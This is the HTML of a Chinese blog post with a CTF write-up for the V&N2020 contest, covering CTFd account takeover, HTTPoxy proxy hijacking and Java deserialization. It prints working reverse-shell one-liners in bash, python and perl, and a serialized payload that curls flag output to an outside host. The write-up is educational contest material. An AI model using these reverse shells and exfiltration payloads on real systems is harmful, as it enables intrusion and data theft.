@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="V&N2020公开赛wp"/>
+
+
+
+
+  <meta name="keywords" content="wp," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2020/03/02/V-N2020公开赛wp/"/>
+
+
+<meta name="description" content="学了两天java，整个人都不好了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="V&amp;N2020公开赛wp">
+<meta property="og:url" content="https://glotozz.github.io/2020/03/02/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9Bwp/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:description" content="学了两天java，整个人都不好了">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/03/02/7xHTshBMAYnokdu.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/02/vckehY1u7Xx2P9b.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/02/ukOrZtcKYvLTIe5.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/02/MJAxCXdeBbOTHhL.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/02/p8YLPX1a7UNEQ6T.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/02/Y8P2ZIzyqAcf6NM.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/02/1N5siQ8OfpXzqgE.png">
+<meta property="article:published_time" content="2020-03-02T14:06:02.000Z">
+<meta property="article:modified_time" content="2020-03-02T07:30:46.234Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/03/02/7xHTshBMAYnokdu.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> V&N2020公开赛wp - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          V&N2020公开赛wp
+        
+      </h1>
+
+      <time class="post-time">
+          Mar 02 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <p>学了两天java，整个人都不好了</p>
+<meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#happy-ctfd">Happy-CTFd</a></li>
+<li><a href="#checkin">CHECKIN</a></li>
+<li><a href="#timetravel">TimeTravel</a></li>
+<li><a href="#easyspringmvc">EasySpringMVC</a></li>
+<li><a href="#参考链接">参考链接：</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<h4><span id="happy-ctfd">Happy-CTFd</span></h4><p>CTFd前些天出的漏洞，注册用户时判断用户是否存在的时候没有对两端空格进行处理，而插入数据库的时候去除了两端的空格。开个隐私窗口为新帐户启动密码重置，生成的token链接中对应了admin账户，我们先修改用户名为其他，再去邮箱重置admin帐户的密码。</p>
+<h4><span id="checkin">CHECKIN</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">import os</span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file &#x3D; open(&quot;flag.txt&quot;, &quot;r&quot;)</span><br><span class="line"># flag &#x3D; flag_file.read()</span><br><span class="line"># flag_file.close()</span><br><span class="line">#</span><br><span class="line"># @app.route(&#39;&#x2F;flag&#39;)</span><br><span class="line"># def flag():</span><br><span class="line">#     return flag</span><br><span class="line">## want flag? naive!</span><br><span class="line"></span><br><span class="line"># You will never find the thing you want:) I think</span><br><span class="line">@app.route(&#39;&#x2F;shell&#39;)</span><br><span class="line">def shell():</span><br><span class="line">    os.system(&quot;rm -f flag.txt&quot;)</span><br><span class="line">    exec_cmd &#x3D; request.args.get(&#39;c&#39;)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    return &quot;1&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def source():</span><br><span class="line">    return open(&quot;app.py&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app.run(host&#x3D;&#39;0.0.0.0&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>emmm，其实就考了一个知识点</p>
+<blockquote>
+<p>在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部（上文是利用 rm -f flag.txt）删除之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd，通过这个我们即可得到被删除文件的内容。 </p>
+</blockquote>
+<p>类似的还有/proc/xxx/下的cwd是软链接，self表示本进程。当我们通过访问Apache运行的网站时，<code>/proc/self/cwd/</code>就相当于apache的根目录</p>
+<p>如果有回显，直接<code>cat /proc/*/fd/*</code>即可，但是本题没有回显，需要反弹shell，这里提供3中反弹方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3NC4wLjIyMi4yMDMvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;mport socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.0.222.203&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&quot;&#x2F;bin&#x2F;sh&quot;,&quot;&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;174.0.222.203:1234&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/02/7xHTshBMAYnokdu.png" alt="Snipaste_2020-03-02_10-55-26.png"></p>
+<h4><span id="timetravel">TimeTravel</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在文件读取，尝试<code>/start.sh</code></p>
+<img src="https://i.loli.net/2020/03/02/vckehY1u7Xx2P9b.png" alt="Snipaste_2020-03-02_11-12-33.png" style="zoom:67%;">
+
+<p>开启了<code>php-fpm</code>，<code>http://127.0.0.1:5000/api/eligible</code>服务就是这个<code>/srv/app.py</code>提供的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/api/eligible')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    current_year = int(datetime.datetime.now().strftime(<span class="string">"%Y"</span>))</span><br><span class="line">    <span class="keyword">if</span> current_year &lt; <span class="number">2050</span>:</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">"success"</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">"success"</span>: <span class="literal">True</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>代码没有漏洞，只能利用中间件</p>
+<blockquote>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">HTTPoxy漏洞（CVE-2016-5385）</a></p>
+</blockquote>
+<p>需要返回的json数据中为True，可得flag</p>
+<p>传入一个 Proxy头，使其产生一个 HTTP_PROXY 环境变量，这个环境变量再被程序里的 GuzzleHttp 使用，即可使流量走代理，控制返回的请求。 </p>
+<p>vps开个服务，flask默认5000</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/api/eligible')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> json.dumps(&#123;<span class="string">"success"</span>: <span class="literal">True</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>添加 <code>Proxy: http://174.0.222.203:5000</code></p>
+<p>但是Linux靶机没flask模块，用SimpleHTTPServer模块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoHttpServer</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.send_response(<span class="number">200</span>, message=<span class="string">'OK'</span>)</span><br><span class="line">        self.send_header(<span class="string">'Content-Type'</span>, <span class="string">'application/json'</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(json.dumps(&#123;<span class="string">"success"</span>: <span class="literal">True</span>&#125;).encode())</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server = HTTPServer((<span class="string">'0.0.0.0'</span>, <span class="number">1234</span>), DemoHttpServer)</span><br><span class="line">    print(<span class="string">'Server is running, user &lt;Ctrl+C&gt; to srop.'</span>)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/03/02/ukOrZtcKYvLTIe5.png" alt="Snipaste_2020-03-02_11-54-10.png" style="zoom:67%;">
+
+<p>php也可，更方便</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$arr &#x3D; array(&quot;success&quot;&#x3D;&gt;true);</span><br><span class="line">header(&quot;Content-Type:application&#x2F;json&quot;);</span><br><span class="line">echo json_encode($arr);</span><br></pre></td></tr></table></figure>
+
+<p>当前目录启动<code>php -S 0:2333</code></p>
+<h4><span id="easyspringmvc">EasySpringMVC</span></h4><p>给了war包，解压，</p>
+<p><img src="https://i.loli.net/2020/03/02/MJAxCXdeBbOTHhL.png" alt="Snipaste_2020-03-02_12-36-46.png"></p>
+<p>tools目录下的两个类都实现了<code>Serializable</code>，其中<code>Tools类</code>还定义了<code>readObject()</code>方法，在反序列化时会自动触发。</p>
+<p><code>ClientInfo类</code>是用户信息类。</p>
+<p><code>ClentInfoFilter</code>类中先判断cookie中是否存在<code>cinfo</code>字段，</p>
+<p>没有的话实例化一个<code>ClientInfo</code>，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cinfo &#x3D; new ClientInfo(&quot;Anonymous&quot;, &quot;normal&quot;, ((HttpServletRequest)request).getRequestedSessionId());</span><br></pre></td></tr></table></figure>
+
+<p>base64编码，调用<code>Tools.create()</code>进行序列化，并存入cookie。否则进行反序列化</p>
+<p><img src="https://i.loli.net/2020/03/02/p8YLPX1a7UNEQ6T.png" alt="Snipaste_2020-03-02_13-03-53.png"></p>
+<p>也就是说，我们可以通过控制cookie从而控制反序列化的类，这里<code>readObject()</code>已经被重写了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(new ProcessBuilder((String[])((String[])obj))).start();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/02/Y8P2ZIzyqAcf6NM.png" alt="Snipaste_2020-03-02_14-15-58.png"></p>
+<p>那么我们可以通过重写Tools类的<code>writeObject()</code>方法，返回一个字符串数组，从而命令执行</p>
+<p>payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tools</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] create(Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String[] cmd = &#123;<span class="string">"/bin/sh"</span>,<span class="string">"-c"</span>,<span class="string">"curl http://174.0.223.65:2333/`/readflag`"</span>&#125;;</span><br><span class="line">        out.writeObject(cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Base64.Encoder encoder = Base64.getEncoder();</span><br><span class="line">        Tools tools = <span class="keyword">new</span> Tools();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Tools.create(tools);</span><br><span class="line">        System.out.println(encoder.encodeToString(bytes));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyAA9jb20udG9vbHMuVG9vbHMAAAAAAAAAAQMAAHhwdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAA3QABy9iaW4vc2h0AAItY3QAKWN1cmwgaHR0cDovLzE3NC4wLjIyMy42NToyMzMzL2AvcmVhZGZsYWdgeA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>一开始我不小心把下面的删了，导致一直失败。</p>
+<p><code>private static final long serialVersionUID = 1L;</code></p>
+<blockquote>
+<p><a href="https://blog.csdn.net/Leon_cx/article/details/81517603" target="_blank" rel="noopener">深入了解序列化writeObject、readObject、readResolve</a></p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/03/02/1N5siQ8OfpXzqgE.png" alt="Snipaste_2020-03-02_15-26-25.png"></p>
+<h4><span id="参考链接">参考链接：</span></h4><p> <a href="https://www.zhaoj.in/read-6407.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://www.zhaoj.in/read-6407.html?tdsourcetag=s_pctim_aiomsg</a> </p>
+<p> <a href="https://cjm00n.top/2020/02/29/V-N公开赛2020-writeup/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://cjm00n.top/2020/02/29/V-N%E5%85%AC%E5%BC%80%E8%B5%9B2020-writeup/?tdsourcetag=s_pctim_aiomsg</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/wp/" rel="tag"><i class="fa fa-tag"></i> wp</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2020/03/01/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+        <span class="next-text nav-default">FastJson1.2.24反序列化漏洞</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
